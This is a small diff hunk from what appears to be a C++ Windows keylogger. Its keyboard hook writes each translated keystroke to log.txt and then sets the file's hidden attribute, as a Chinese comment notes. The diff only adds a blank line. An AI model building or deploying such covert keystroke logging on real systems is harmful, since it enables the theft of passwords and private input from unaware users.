@@ -108,6 +108,7 @@ LRESULT CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam) {
 		openfile();
 		of << translate(p->vkCode, p->scanCode);
 		closefile();
+
 	}
 	::SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);	//增加隐藏文件属性
 	return CallNextHookEx(hook, code, wparam, lparam);
